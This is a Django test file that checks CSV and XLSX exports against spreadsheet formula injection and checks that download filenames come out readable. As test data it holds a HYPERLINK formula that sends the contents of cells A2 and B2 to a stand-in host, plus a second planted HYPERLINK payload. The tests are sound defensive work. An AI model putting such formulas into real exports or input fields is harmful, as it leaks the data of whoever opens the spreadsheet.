"""
v3.45.2 — downloads a person opens in a spreadsheet, and download filenames.

Found by the 10-10-26 auto-run.

1. A spreadsheet program runs a cell that starts with `=`, `+`, `-` or `@` as
   a formula. Members type free text that officers later export (a
   service-hours description, a poll answer, a Kai report, a phone number), so
   every export writes through `safe_csv_writer`, which marks such a cell as
   text. The guard at the bottom fails if a view goes back to `csv.writer`.

2. Three downloads put a title into `Content-Disposition` with an f-string.
   An em dash or a curly apostrophe in the title turned the whole header into
   an encoded blob that a browser does not read as a filename.
"""
import csv
import datetime
import io
import pathlib
import re

from django.conf import settings
from django.test import Client, TestCase
from django.urls import reverse

from src.models import (
    ChapterMinutes, ParliamentUser, ServiceHoursSubmission, ServicePeriod,
)
from src.utils.export_utils import csv_safe_cell, safe_csv_writer

FORMULA = '=HYPERLINK("https://example.invalid/?x="&A2&B2,"Receipt")'


def _user(user_id, **kwargs):
    defaults = dict(name=f'User {user_id}', username=f'user_{user_id}', member_type='Member')
    defaults.update(kwargs)
    return ParliamentUser.objects.create_user(user_id=user_id, password='testpass123', **defaults)


class CsvSafeCellTests(TestCase):
    def test_formula_starts_are_marked_as_text(self):
        for value in ('=1+1', '+SUM(A1)', '-A1', '@SUM(1)', '\t=1', '\r=1', FORMULA):
            with self.subTest(value=value):
                self.assertEqual(csv_safe_cell(value), "'" + value)

    def test_ordinary_text_is_unchanged(self):
        for value in ('Habitat for Humanity', 'a=b', 'me@example.com', '', 'Fall 2026'):
            with self.subTest(value=value):
                self.assertEqual(csv_safe_cell(value), value)

    def test_phone_numbers_and_numbers_are_unchanged(self):
        for value in ('+1 (205) 555-0100', '+12055550100', '-3.5', '-', '+1,000'):
            with self.subTest(value=value):
                self.assertEqual(csv_safe_cell(value), value)

    def test_non_strings_are_unchanged(self):
        today = datetime.date(2026, 10, 10)
        for value in (None, 0, -5, 2.5, today, True):
            with self.subTest(value=value):
                self.assertIs(csv_safe_cell(value), value)

    def test_writer_cleans_every_row(self):
        buf = io.StringIO()
        writer = safe_csv_writer(buf)
        writer.writerow(['=A1', 'ok', 3])
        writer.writerows([['@x', '+1 205 555 0100']])
        rows = list(csv.reader(io.StringIO(buf.getvalue())))
        self.assertEqual(rows, [["'=A1", 'ok', '3'], ["'@x", '+1 205 555 0100']])


class ServiceHoursExportTests(TestCase):
    def test_member_typed_formula_is_exported_as_text(self):
        member = _user('9601')
        today = datetime.date.today()
        period = ServicePeriod.objects.create(
            name='Fall', is_active=True,
            start_date=today - datetime.timedelta(days=30),
            end_date=today + datetime.timedelta(days=30),
        )
        client = Client()
        client.force_login(member)
        client.post(reverse('submit_service_hours'), {
            'period': period.pk, 'hours': '2', 'service_date': today.isoformat(),
            'organization': '@SUM(1+1)', 'description': FORMULA,
        })
        self.assertEqual(ServiceHoursSubmission.objects.count(), 1)

        admin = _user('9602', is_admin=True)
        client = Client()
        client.force_login(admin)
        response = client.get(reverse('export_service_csv'))
        self.assertEqual(response.status_code, 200)
        rows = list(csv.reader(io.StringIO(response.content.decode())))
        self.assertEqual(len(rows), 2)
        self.assertIn("'" + FORMULA, rows[1])
        self.assertIn("'@SUM(1+1)", rows[1])
        for cell in rows[1]:
            self.assertFalse(cell.startswith(('=', '@')), cell)


class DirectoryExportTests(TestCase):
    def setUp(self):
        self.member = _user('9501', email='m9501@example.com')
        # v3.50.0 — the profile form now refuses this value, so it is planted
        # directly: the export must still be safe for rows saved before that.
        client = Client()
        client.force_login(self.member)
        client.post(reverse('profile'), {
            'profile_submit': '1', 'username': self.member.username,
            'preferred_name': '', 'email': 'm9501@example.com',
            'phone_number': '=HYPERLINK("//a.co")',
        })
        self.member.refresh_from_db()
        self.assertEqual(self.member.phone_number, '')
        type(self.member).objects.filter(pk=self.member.pk).update(phone_number='=HYPERLINK("//a.co")')
        self.reader = Client()
        self.reader.force_login(_user('9502', phone_number='+1 205 555 0100'))

    def test_csv(self):
        response = self.reader.get(reverse('export_directory') + '?format=csv')
        rows = list(csv.reader(io.StringIO(response.content.decode())))
        cells = [c for row in rows for c in row]
        self.assertIn('\'=HYPERLINK("//a.co")', cells)
        self.assertIn('+1 205 555 0100', cells)
        self.assertFalse([c for c in cells if c.startswith('=')])

    def test_xlsx_has_no_formula_cells(self):
        import openpyxl
        response = self.reader.get(reverse('export_directory') + '?format=xlsx')
        self.assertEqual(response.status_code, 200)
        sheet = openpyxl.load_workbook(io.BytesIO(response.content)).active
        values = []
        for row in sheet.iter_rows():
            for cell in row:
                self.assertNotEqual(cell.data_type, 'f', cell.coordinate)
                values.append(cell.value)
        self.assertIn('=HYPERLINK("//a.co")', values)


class DownloadFilenameTests(TestCase):
    """A title with typographic punctuation still gets a readable header."""

    TITLES = ['Chapter Meeting', 'Chapter Meeting — Oct 5', 'Brother’s Night', 'The "Big" Meeting']

    def test_chapter_minutes_pdf(self):
        admin = _user('9702', is_admin=True, member_type='Officer')
        client = Client()
        client.force_login(admin)
        for title in self.TITLES:
            with self.subTest(title=title):
                minutes = ChapterMinutes.objects.create(
                    title=title, date=datetime.date(2026, 10, 5),
                    start_time=datetime.time(18, 0), created_by=admin,
                )
                response = client.get(reverse('download_minutes_pdf', args=[minutes.id]))
                self.assertEqual(response.status_code, 200)
                header = response.headers['Content-Disposition']
                self.assertTrue(header.startswith('attachment; filename'), header)
                self.assertNotIn('=?utf-8?', header)
                # No unescaped quote inside the quoted filename.
                quoted = re.match(r'attachment; filename="((?:[^"\\]|\\.)*)"$', header)
                self.assertTrue(quoted or "filename*=utf-8''" in header, header)

                response = client.get(reverse('download_minutes_pdf', args=[minutes.id]) + '?preview=1')
                self.assertTrue(response.headers['Content-Disposition'].startswith('inline; filename'))


class NoViewWritesCsvDirectlyTests(TestCase):
    """Every export goes through `safe_csv_writer`."""

    def test_csv_writer_is_only_called_in_export_utils(self):
        src = pathlib.Path(settings.BASE_DIR) / 'src'
        allowed = src / 'utils' / 'export_utils.py'
        offenders = []
        for path in src.rglob('*.py'):
            if path == allowed or 'tests' in path.parts or path.name.startswith('test_'):
                continue
            if 'management' in path.parts:
                continue  # commands write files for the operator, not downloads
            for number, line in enumerate(path.read_text(encoding='utf-8').splitlines(), 1):
                if re.search(r'\bcsv\.(writer|DictWriter)\(', line) and not line.lstrip().startswith('#'):
                    offenders.append(f'{path.relative_to(src.parent)}:{number}')
        self.assertEqual(
            offenders, [],
            'Use safe_csv_writer from src/utils/export_utils.py for a download. '
            'A plain csv.writer lets member-typed text run as a spreadsheet formula.',
        )
